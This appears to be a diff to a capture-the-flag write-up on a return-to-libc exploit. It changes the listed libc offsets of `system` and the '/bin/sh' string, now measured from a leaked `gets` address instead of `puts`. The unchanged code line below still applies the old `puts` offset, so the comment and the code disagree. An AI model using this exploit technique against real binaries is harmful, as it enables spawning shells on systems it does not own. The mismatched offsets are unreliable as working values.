@@ -96,9 +96,9 @@
   - Now, we knew the particular addresses of `system` and `str_bin_sh` in the libc that the binary use
     ```py
     '''
-    when puts address is the base address 
-    system :  	-0x32190
-    str_bin_sh : 0x13019d
+    when gets_address is the base address 
+    system : -0x316e0
+    str_bin_sh : 0x130c4d
     '''
     
     system_address = p64(leaked_puts_address -0x32190)
